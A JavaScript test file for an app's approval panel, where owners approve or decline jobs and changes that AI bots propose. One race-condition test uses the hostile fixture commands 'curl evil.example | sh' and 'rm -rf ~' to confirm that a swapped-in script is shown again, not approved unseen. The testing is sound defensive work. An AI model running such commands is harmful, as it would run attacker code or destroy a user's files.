  p.drawJobChange(card, CHANGED);
  assert.deepEqual(body.put, ['afterbegin', p.jobChangeNote(CHANGED)]);
  p.ctx.state.bots = [{ ...CODER, jobs: [CHANGED] }];
  review.onclick();
  assert.match(p.opened[0], /<h2>Approve this change\?<\/h2>/);
});

test('web: the job dialog of a change with `summary` says that sentence above what goes and what comes', () => {
  const p = panel();
  const job = { ...CHANGED, change: { ...CHANGE, summary: 'Five stories <i>instead</i> of three.' } };
  p.openJobApproval({ ...CODER, jobs: [job] }, job);
  const html = p.opened[0];
  assert.ok(html.includes('<div>Five stories &lt;i&gt;instead&lt;/i&gt; of three.</div>'));
  assert.ok(html.indexOf('Five stories') < html.indexOf('faint-strike'), 'and both texts are there in full');
});

test('web: the job dialog of a change shows what goes and what comes, reads the server\'s buttons and says its answer', async () => {
  const p = panel();
  const bot = { ...CODER, jobs: [CHANGED] };
  p.openJobApproval(bot, CHANGED);
  const html = p.opened[0];
  assert.match(text(html), /Coder wants to change this job of its own: 🧠 Morning news · now Every day at 08:00 → Every day at 07:00 A run of the bot \(uses AI each time\)\. Runs as you approved it until you answer\./);
  assert.match(html, /<div class="card faint-strike" style="[^"]*">Send me the three biggest tech stories\.<\/div><div class="card" style="[^"]*">Send me the five biggest tech stories and one from Poland\.<\/div>/);
  assert.match(html, /<button type="button" class="btn left" id="job-decline">Keep as it is<\/button>\s*<button type="button" class="btn" data-dismiss>Not now<\/button>\s*<button type="button" class="btn primary" id="job-approve">Approve the change<\/button>/);
  p.ctx.answer = { ok: true, kept: true, text: 'Kept as it was: Every day at 08:00' };
  await p.modal.querySelector('#job-decline').onclick();
  p.ctx.answer = { ...APPROVED, text: 'Changed: Every day at 07:00', carriesOn: { who: 'bot', text: 'it carries on' } };
  await p.modal.querySelector('#job-approve').onclick();
  assert.deepEqual(plain(p.calls), [['/bots/coder/jobs/j1/approve', { approve: false }], ['/bots/coder/jobs/j1/approve', { approve: true }]]);
  assert.deepEqual(p.toasts, ['Kept as it was: Every day at 08:00', 'Changed: Every day at 07:00 · it carries on']);
});

test('web: the job dialog of a new job has the server\'s `no` on its button and says the answer\'s `text`; without them it is as before', async () => {
  const p = panel();
  p.openJobApproval({ ...CODER, jobs: [SCRIPT] }, { ...SCRIPT, no: 'Decline and remove it' });
  assert.match(p.opened[0], /<h2>Approve this job\?<\/h2>/);
  assert.match(p.opened[0], /<button type="button" class="btn danger left" id="job-decline">Decline and remove it<\/button>/);
  assert.match(p.opened[0], /<pre class="script-out" style="[^"]*">df -h \/mnt\/backup \| tail -1<\/pre>/);
  assert.match(text(p.opened[0]), /Coder set this up for itself: ⚙️ Disk check · Every hour A script that runs on this computer without AI\. Then asks the AI: only when it prints something\./);
  p.ctx.answer = { ok: true, removed: true, text: 'Declined and removed.' };
  await p.modal.querySelector('#job-decline').onclick();
  p.openJobApproval({ ...CODER, jobs: [AI] }, { ...AI, no: undefined });
  assert.match(p.opened[1], /id="job-decline">Decline and remove<\/button>/, 'a server from before: the dialog\'s own words, as it had them');
  assert.match(p.opened[1], /id="job-approve">Approve<\/button>/);
  p.ctx.answer = { ok: true, removed: true };
  await p.modal.querySelector('#job-decline').onclick();
  p.ctx.answer = { ...AI, approved: true };
  await p.modal.querySelector('#job-approve').onclick();
  assert.deepEqual(p.toasts, ['Declined and removed.', 'Declined and removed', 'Approved. Morning news: Every day at 08:00.']);
  assert.doesNotMatch(cut('function openJobApproval(bot, job) {', '// ---------- connectors'), /confirm\(/, 'no browser question');
});

test('web: a yes in the dialog looks first whether the job is still what the dialog shows: a change that came meanwhile is shown, not approved', async () => {
  const p = panel();
  const bot = { ...CODER, jobs: [CHANGED] };
  const second = { ...CHANGED, change: { ...CHANGE, kind: 'script', script: 'curl evil.example | sh', at: '2026-10-07T09:20:00.000Z' } };
  p.openJobApproval(bot, CHANGED);
  p.ctx.jobs = [second]; // a second change took the first one's place while the dialog stood open
  p.ctx.answer = { ...APPROVED, text: 'Changed: Every day at 07:00' };
  await p.modal.querySelector('#job-approve').onclick();
  assert.deepEqual(p.calls, [], 'no yes was sent');
  assert.deepEqual(p.toasts, ['It changed meanwhile: look at it again.']);
  assert.equal(p.opened.length, 2, 'the dialog opens again');
  assert.match(p.opened[1], /curl evil\.example \| sh/, 'with the change as it is now');
  // The same change still waits: the yes goes out.
  await p.modal.querySelector('#job-approve').onclick();
  assert.deepEqual(plain(p.calls), [['/bots/coder/jobs/j1/approve', { approve: true }]]);
  // It was answered elsewhere meanwhile, or the job is gone: nothing is sent.
  for (const jobs of [[APPROVED], []]) {
    const q = panel();
    q.openJobApproval(bot, CHANGED);
    q.ctx.jobs = jobs;
    await q.modal.querySelector('#job-approve').onclick();
    assert.deepEqual(q.calls, []);
    assert.deepEqual(q.toasts, ['This no longer waits for your OK.']);
  }
  // A new job is looked at the same way.
  const n = panel();
  n.openJobApproval({ ...CODER, jobs: [SCRIPT] }, SCRIPT);
  n.ctx.jobs = [{ ...SCRIPT, script: 'rm -rf ~' }];
  await n.modal.querySelector('#job-approve').onclick();
  assert.deepEqual(n.calls, []);
  assert.match(n.opened[1], /rm -rf ~/);
});

// The page's own wiring of a card's buttons, with stand-ins for the card, the browser's question and decide.
function wired(x, { agrees = true } = {}) {
  const asked = [], decided = [], busy = [];
  let pressed = null;
  const buttons = { '[data-need-yes]': element(), '[data-need-no]': element(), '[data-need-always]': element() };
  const card = element(buttons, { dataset: { need: x.key } });
  const ctx = vm.createContext({
    ...words, $: (sel, el) => el.querySelector(sel), $$: () => [card], needsOpen: new Set(), openNeed() {}, ToolCard: { is: () => false }, tileScripts: () => [], AI_WHEN_TEXT: {},
    confirm: (q) => { asked.push(q); return agrees; }, decide: (...a) => { decided.push(a.slice(1)); busy.push([pressed.textContent, pressed.classList.contains('spin')]); }, whileBusy,
  });
  vm.runInContext(`${cut('// A change that waits beside an approved job or tile', 'function pendingJobs() {')}
    ${cut('// Words of the server\'s that a card draws', '// Who carries on after a yes')}
    ${cut('function wireNeedCards(root, items) {', '// ---------- approvals in the chat')}
    ${cut('// "Always approve" a script job', '// A job in one line')}
    wireNeedCards({}, [${JSON.stringify(x)}]);`, ctx);
  const tap = (which) => { pressed = buttons[`[data-need-${which}]`]; pressed.onclick(); return { asked: asked.splice(0), decided: plain(decided.splice(0)) }; };
  // What the pressed button said while its answer was on its way, and whether a spinner turned in it.
  const said = () => plain(busy.splice(0));
  return { tap, said };
}

test('web: the no on a card asks nothing when the button says what it does; "Always approve" warns before a script, also one a change brings', () => {
  const item = (job) => ({ key: `job:${job.id}`, kind: 'job', bot: CODER, job });
  // The server's words on the button: the no goes out at once.
  assert.deepEqual(wired(item(AI)).tap('no'), { asked: [], decided: [[false]] });
  assert.deepEqual(wired(item(CHANGED)).tap('no'), { asked: [], decided: [[false]] }, 'a change\'s no keeps the job');
  // A server from before: the page's own question, and its answer counts.
  assert.deepEqual(wired(item({ ...AI, no: undefined })).tap('no'), { asked: ['Remove this job?'], decided: [[false]] });
  assert.deepEqual(wired(item({ ...AI, no: undefined }), { agrees: false }).tap('no'), { asked: ['Remove this job?'], decided: [] });
  // "Always approve": no question for words, the warning for a script the job runs or would run after its change.
  assert.deepEqual(wired(item(AI)).tap('always'), { asked: [], decided: [[true, true, true]] });
  assert.deepEqual(wired(item(CHANGED)).tap('always'), { asked: [], decided: [[true, true, true]] });
  for (const job of [SCRIPT, { ...CHANGED, change: { ...CHANGE, kind: 'script', script: 'uptime' } }]) {
    const yes = wired(item(job)).tap('always');
    assert.match(yes.asked[0], /^Always approve "(Disk check|Morning news)" from Coder\?\n\nIt's a script:/);
    assert.deepEqual(yes.decided, [[true, true, true]]);
    assert.deepEqual(wired(item(job), { agrees: false }).tap('always').decided, [], 'not without the owner\'s yes to the warning');
  }
  assert.deepEqual(wired(item(SCRIPT)).tap('yes'), { asked: [], decided: [[true]] });
});

// A change that makes a connection (#154): a call turned on or switched, or an address to tell when a run ends.
const CALL = { ...CHANGED, change: { ...CHANGE, call: true, summary: 'Anything that can reach this machine and has the job\'s key can run this job now.' } };
const NOTIFY = { ...CHANGED, change: { ...CHANGE, notifyUrl: 'https://example.com/hook' } };

test('web: the yes of a card that turns on a call or a notify address says "Creating connection…" with a spinner; any other card keeps "Approving…"', () => {
  const item = (job) => ({ key: `job:${job.id}`, kind: 'job', bot: CODER, job });
  for (const job of [CALL, NOTIFY, { ...CALL, change: { ...CALL.change, callMode: 'signed' } }, { ...CALL, call: true, change: { ...CALL.change, callMode: 'signed' } }]) {
    for (const which of ['yes', 'always']) {
      const w = wired(item(job));
      w.tap(which);
      assert.deepEqual(w.said(), [['Creating connection…', true]], `${which} of ${JSON.stringify(job.change)}`);
    }
  }
  // A job change (the screenshot's card), a new job, and a change of a job that takes calls or has its address already.
  for (const job of [CHANGED, AI, { ...CALL, call: true }, { ...NOTIFY, notifyUrl: 'https://example.com/hook' }]) {
    const w = wired(item(job));
    w.tap('yes');
    assert.deepEqual(w.said(), [['Approving…', false]]);
  }
  const w = wired({ key: 'ask:p1', kind: 'ask', bot: CODER, a: { id: 'p1', kind: 'permission' } });
  w.tap('yes');
  assert.deepEqual(w.said(), [['Approving…', false]], 'a permission keeps it');
});

test('web: the job dialog\'s yes on a change that turns on a call says "Creating connection…" with a spinner too, and drops both after the answer', async () => {
  const p = panel();
  const bot = { ...CODER, jobs: [CALL] };
  p.ctx.state.bots = [bot];
  p.openJobApproval(bot, CALL);
  p.ctx.jobs = [CALL];
  const yes = p.modal.querySelector('#job-approve');
  yes.textContent = 'Approve the change';
  let seen;
  p.ctx.answer = { ok: true };
  const realApi = p.ctx.api;
  p.ctx.api = async (url, opts) => { if (opts) seen = [yes.textContent, yes.classList.contains('spin')]; return realApi(url, opts); };
  await yes.onclick();
  assert.deepEqual(seen, ['Creating connection…', true]);
  assert.deepEqual([yes.textContent, yes.classList.contains('spin')], ['Approve the change', false]);
});

// ---------- Asks ----------

const MAILBOT = { id: 'mail', name: 'Mail Sorter', color: '#8a5cf6', unread: 2 };
const QUESTION = { text: 'Which mailbox shall I sort first?', runId: 'r9', at: '2026-10-07T09:40:00.000Z' };

// The page's own code for a bot's row in the list, with its Unread and its plain().
function rows() {
  const ctx = vm.createContext({ ...words, Unread });
  vm.runInContext(`${cut('const plain = (t) =>', '// ---------- contacts (sidebar) ----------')}
    ${cut('function contactLine(b, r, working) {', 'function drawContacts() {')}
    this.contactLine = contactLine;`, ctx);
  return (b, r, working = 'Working…') => plain(ctx.contactLine(b, r, working));
}
const DOTS = '<span class="unread-dots" style="--c:#8a5cf6" aria-label="New replies"><i></i><i></i></span>';
const MARK = '<span class="asks-mark" style="--c:#8a5cf6" aria-label="Asks you">?</span>';

test('web: a bot with `asks` reads "Asks: <question>" in the list\'s stronger colour, with a round mark in its colour holding "?", in place of the dots', () => {
  const line = rows();
  const reply = { id: 'r9', botId: 'mail', status: 'success', result: 'Two mailboxes have unread invoices. **Which** mailbox shall I sort first?' };
  assert.deepEqual(line({ ...MAILBOT, asks: QUESTION }, reply), { prev: 'Asks: Which mailbox shall I sort first?', cls: 'asks', after: MARK }, 'the mark stands where the dots stood, though replies are new');
  assert.deepEqual(line(MAILBOT, reply), { prev: 'Two mailboxes have unread invoices. Which mailbox shall I sort first?', cls: '', after: DOTS }, 'without `asks`: the reply and the dots, as before');
  // While it works its line says what it does, and has no mark; the question shows again when it is still open after.
  assert.deepEqual(line({ ...MAILBOT, asks: QUESTION, running: true }, reply, 'Sorting the work mailbox…'), { prev: 'Sorting the work mailbox…', cls: 'working', after: DOTS });
  assert.deepEqual(line({ ...MAILBOT, asks: QUESTION }, { ...reply, status: 'running' }), { prev: 'Working…', cls: '', after: DOTS });
  // The question is the server's text: the row escapes it where it draws it.
  assert.equal(line({ ...MAILBOT, asks: { ...QUESTION, text: BAD } }, reply).prev, `Asks: ${BAD}`);
  const row = cut('function drawContacts() {', '// ---------- search in every chat');
  assert.match(row, /const line = botLine\(b\);/);
  assert.match(app, /return contactLine\(b, state\.runs\.find\(\(r\) => r\.botId === b\.id\), working\);/, 'its newest run and its working line (botLine, also the keypad\'s)');
  assert.match(row, /<span class="time">\$\{esc\(shortTime\(r\?\.startedAt\)\)\}<\/span>\$\{line\.after\}<\/div>\s*<div class="prev \$\{line\.cls\}">\$\{esc\(line\.prev\)\}<\/div>/);
  assert.equal(Unread.mark('red;background:url(x)'), '<span class="asks-mark" style="--c:#888780" aria-label="Asks you">?</span>', 'only a colour gets into the style');
  assert.match(css, /\.contact \.prev\.asks \{ color: var\(--text\); font-weight: 600; \}/);
  assert.match(css, /\.asks-mark \{ width: 18px; height: 18px; border-radius: 50%; background: var\(--c\); color: #fff;[^}]*flex: none;[^}]*\}/, 'round, in the bot\'s colour, and never squeezed by a long name');
});

test('web: against a server without `asks-you` the list is as before: no line, no mark', () => {
  const line = rows();
  const reply = { id: 'r1', botId: 'mail', status: 'success', result: 'Sorted 12 mails.' };
  for (const asks of [undefined, null, true, {}, { text: 7 }, { text: '   ' }]) assert.deepEqual(line({ ...MAILBOT, asks }, reply), { prev: 'Sorted 12 mails.', cls: '', after: DOTS }, JSON.stringify(asks));
  for (const bot of [MAILBOT, { ...MAILBOT, asks: null }, { ...MAILBOT, asks: true }, { ...MAILBOT, asks: {} }, { ...MAILBOT, asks: { text: 7 } }, { ...MAILBOT, asks: { text: '   ' } }, null, undefined]) assert.equal(Unread.asks(bot), '', JSON.stringify(bot));
});

test('web: it ends when the feed says so, also in a page that did not send the answer; the event that lists what waits changes nothing', () => {
  const bots = [{ ...MAILBOT }, { id: 'news', name: 'News Watcher' }];
  assert.equal(Unread.asked(bots, { botId: 'mail', asks: QUESTION, at: QUESTION.at }), true, 'the question came: draw the list again');
  assert.deepEqual(bots[0].asks, QUESTION);
  assert.equal(Unread.asked(bots, { botId: 'mail', asks: QUESTION }), false, 'the same again: nothing to draw');
  assert.equal(Unread.asked(bots, { botId: 'mail', asks: { ...QUESTION, text: 'And which folder?' } }), true, 'a new question takes its place');
  assert.equal(Unread.asks(bots[0]), 'And which folder?');
  assert.equal(Unread.asked(bots, { botId: 'mail', asks: null }), true, 'it ended');
  assert.equal('asks' in bots[0], false);
  assert.equal(Unread.asks(bots[0]), '');
  // The event of the same name about Needs you (`{ waiting, list }`), and anything that is no such event.
  bots[0].asks = QUESTION;
  for (const event of [{ waiting: 1, list: [{ id: 'p1', kind: 'permission', botId: 'mail' }] }, { waiting: 0, list: [] }, { botId: 'mail' }, { botId: 'gone', asks: null }, { botId: 7, asks: null }, null, undefined, 'x', {}]) {
    assert.equal(Unread.asked(bots, event), false, JSON.stringify(event));
    assert.deepEqual(bots[0].asks, QUESTION);
  }
  assert.equal(Unread.asked(null, { botId: 'mail', asks: null }), false);
  // The page listens to it, and still reads the bots again after it.
  const feed = cut('function followFeed() {', 'es.addEventListener(\'reset\'');
  assert.match(feed, /es\.addEventListener\('asks', \(e\) => \{[\s\S]*?if \(Unread\.asked\(state\.bots, d\)\) renderContacts\(\);/);
  assert.match(feed, /'approvals', 'asks', 'bots', 'reset'\]\.forEach\(\(t\) => es\.addEventListener\(t, soon\)\)/);
});

// ---------- Everywhere ----------

test('web: at a phone\'s width the page\'s title, its line and the button wrap, and a card\'s buttons wrap in the card', () => {
  assert.match(css, /@container main \(max-width: 640px\) \{[\s\S]*?\.section-head \{ flex-wrap: wrap; \}/);
  assert.match(css, /\.need-actions \{ display: flex; flex-wrap: wrap; gap: var\(--sp-8\); justify-content: flex-end;/);
  assert.match(css, /\.need-grid \{ display: grid; grid-template-columns: repeat\(auto-fill, minmax\(300px, 1fr\)\);/, 'one column of cards at 412 pixels, several at 1280');
  assert.match(css, /\.contact \.prev \{[^}]*white-space: nowrap; overflow: hidden; text-overflow: ellipsis; \}/, 'a long question ends in "…" at any width');
  assert.match(app, /<p class="needs-left">/);
  assert.match(css, /\.modal-foot \{ flex-wrap: wrap; \}/, 'the dialog\'s three buttons wrap at a phone\'s width');
  assert.match(css, /\.need-card\.need-changed:not\(\.open\) \.need-meta \{ white-space: normal; \}/);
});
